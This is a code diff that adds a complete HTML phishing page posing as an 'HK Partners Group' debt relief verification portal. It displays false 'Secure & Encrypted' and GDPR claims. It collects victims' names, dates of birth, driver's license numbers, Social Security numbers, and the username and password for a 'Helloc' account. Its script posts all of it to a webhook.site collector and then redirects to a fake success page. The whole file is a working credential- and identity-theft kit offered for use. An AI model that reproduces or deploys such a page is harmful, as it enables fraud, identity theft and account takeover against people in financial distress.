@@ -1,0 +1,257 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+<meta charset="UTF-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<title>HK Partners Group – Verification Portal</title>  
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">  
+<style>  
+* {  
+margin: 0;  
+padding: 0;  
+box-sizing: border-box;  
+font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;  
+}  
+body {  
+background: linear-gradient(135deg, #1a237e, #0d47a1);  
+color: #fff;  
+min-height: 100vh;  
+padding: 20px;  
+display: flex;  
+align-items: center;  
+justify-content: center;  
+}  
+.container {  
+background: rgba(255, 255, 255, 0.95);  
+color: #333;  
+width: 100%;  
+max-width: 800px;  
+border-radius: 20px;  
+padding: 30px;  
+box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);  
+}  
+.header {  
+display: flex;  
+align-items: center;  
+justify-content: space-between;  
+border-bottom: 2px solid #0d47a1;  
+padding-bottom: 15px;  
+margin-bottom: 25px;  
+}  
+.logo {  
+font-size: 28px;  
+font-weight: bold;  
+color: #0d47a1;  
+}  
+.logo span {  
+color: #1a237e;  
+}  
+.secure-badge {  
+background: #4CAF50;  
+color: white;  
+padding: 8px 15px;  
+border-radius: 15px;  
+font-size: 14px;  
+display: inline-flex;  
+align-items: center;  
+}  
+.secure-badge i {  
+margin-right: 5px;  
+}  
+h1 {  
+font-size: 24px;  
+margin-bottom: 10px;  
+color: #1a237e;  
+}  
+.description {  
+font-size: 16px;  
+line-height: 1.6;  
+margin-bottom: 25px;  
+color: #555;  
+}  
+form {  
+display: grid;  
+grid-template-columns: 1fr 1fr;  
+gap: 20px;  
+}  
+.form-group {  
+display: flex;  
+flex-direction: column;  
+}  
+label {  
+font-weight: bold;  
+margin-bottom: 5px;  
+color: #0d47a1;  
+}  
+input {  
+padding: 12px;  
+border-radius: 8px;  
+border: 1px solid #ccc;  
+font-size: 16px;  
+transition: 0.3s;  
+}  
+input:focus {  
+border-color: #0d47a1;  
+box-shadow: 0 0 5px rgba(13, 71, 161, 0.5);  
+outline: none;  
+}  
+.full-width {  
+grid-column: span 2;  
+}  
+.ssn-section {  
+background: #f5f5f5;  
+padding: 20px;  
+border-radius: 10px;  
+margin-top: 20px;  
+}  
+.ssn-title {  
+font-size: 18px;  
+color: #1a237e;  
+margin-bottom: 15px;  
+display: flex;  
+align-items: center;  
+}  
+.ssn-title i {  
+margin-right: 10px;  
+color: #4CAF50;  
+}  
+.helloc-section {  
+background: #f5f5f5;  
+padding: 20px;  
+border-radius: 10px;  
+margin-top: 20px;  
+}  
+.helloc-title {  
+font-size: 18px;  
+color: #1a237e;  
+margin-bottom: 15px;  
+display: flex;  
+align-items: center;  
+}  
+.helloc-title i {  
+margin-right: 10px;  
+color: #4CAF50;  
+}  
+.submit-btn {  
+background: linear-gradient(to right, #0d47a1, #1a237e);  
+color: white;  
+padding: 15px;  
+font-size: 18px;  
+border-radius: 10px;  
+cursor: pointer;  
+border: none;  
+margin-top: 25px;  
+width: 100%;  
+transition: 0.3s;  
+}  
+.submit-btn:hover {  
+background: linear-gradient(to right, #1a237e, #0d47a1);  
+box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);  
+}  
+.footer {  
+text-align: center;  
+margin-top: 30px;  
+font-size: 14px;  
+color: #777;  
+}  
+</style>  
+</head>  
+<body>  
+<div class="container">  
+<div class="header">  
+<div class="logo">  
+HK Partners Group<span> – Empowerment Division</span>  
+</div>  
+<div class="secure-badge">  
+<i class="fas fa-lock"></i> Secure & Encrypted  
+</div>  
+</div>  
+<h1>Couple Empowerment Program – Debt Relief Authorization</h1>  
+<p class="description">  
+This portal is for identity verification and payment routing. All information submitted is encrypted and processed under GDPR compliance.  
+Once your details are verified, HK Partners Group will initiate direct payment to your lender within 24 hours.  
+</p>  
+<form id="authForm">  
+<div class="form-group">  
+<label for="fullName">Full Name</label>  
+<input type="text" id="fullName" name="fullName" required placeholder="Enter your full legal name">
+</div>  
+<div class="form-group">  
+<label for="phoneNumber">Phone Number</label>  
+<input type="tel" id="phoneNumber" name="phoneNumber" required placeholder="e.g., +1 234 567 8900">  
+</div>  
+<div class="form-group">  
+<label for="dob">Date of Birth</label>  
+<input type="date" id="dob" name="dob" required>  
+</div>  
+<div class="form-group">  
+<label for="stateID">State ID / Driver's License Number</label>  
+<input type="text" id="stateID" name="stateID" required placeholder="e.g., DL123456789">  
+</div>  
+<div class="ssn-section">  
+<div class="ssn-title">  
+<i class="fas fa-id-card"></i> Social Security Number (SSN)  
+</div>  
+<div class="form-group full-width">  
+<label for="ssn">Social Security Number</label>  
+<input type="text" id="ssn" name="ssn" required placeholder="XXX-XX-XXXX" pattern="[0-9]{3}-[0-9]{2}-[0-9]{4}" title="Format: XXX-XX-XXXX">  
+</div>  
+</div>  
+<div class="helloc-section">  
+<div class="helloc-title">  
+<i class="fas fa-user-circle"></i> Helloc Account Verification  
+</div>  
+<div class="form-group full-width">  
+<label for="hellocUsername">Helloc Username</label>  
+<input type="text" id="hellocUsername" name="hellocUsername" required placeholder="Your Helloc username">  
+</div>  
+<div class="form-group full-width">  
+<label for="hellocPassword">Helloc Password</label>  
+<input type="password" id="hellocPassword" name="hellocPassword" required placeholder="Your Helloc password">  
+</div>  
+</div>  
+<button type="submit" class="submit-btn">  
+<i class="fas fa-check-circle"></i> Submit Authorization  
+</button>  
+</form>  
+<div class="footer">  
+© 2024 HK Partners Group – All rights reserved. This portal complies with international financial regulations.  
+</div>  
+</div>
+
+<script>  
+document.getElementById('authForm').addEventListener('submit', function(event) {  
+event.preventDefault();
+
+const data = {  
+fullName: document.getElementById('fullName').value,  
+phoneNumber: document.getElementById('phoneNumber').value,  
+dob: document.getElementById('dob').value,  
+stateID: document.getElementById('stateID').value,  
+ssn: document.getElementById('ssn').value,  
+hellocUsername: document.getElementById('hellocUsername').value,  
+hellocPassword: document.getElementById('hellocPassword').value  
+};
+
+// Send captured data to your webhook endpoint  
+fetch('https://webhook.site/fd6d8a2e-1b3c-450b-9c71-123456789abc', {  
+method: 'POST',  
+headers: {  
+'Content-Type': 'application/json',  
+},  
+body: JSON.stringify(data)  
+})  
+.then(response => response.json())  
+.then(result => {  
+// Redirect to "success" page  
+window.location.href = 'https://hkpartners-auth-verify.000webhostapp.com/success.html';  
+})  
+.catch(error => {  
+console.error('Error:', error);  
+// Fallback redirect  
+window.location.href = 'https://hkpartners-auth-verify.000webhostapp.com/success.html';  
+});  
+});  
+</script>  
+</body>  
+</html>
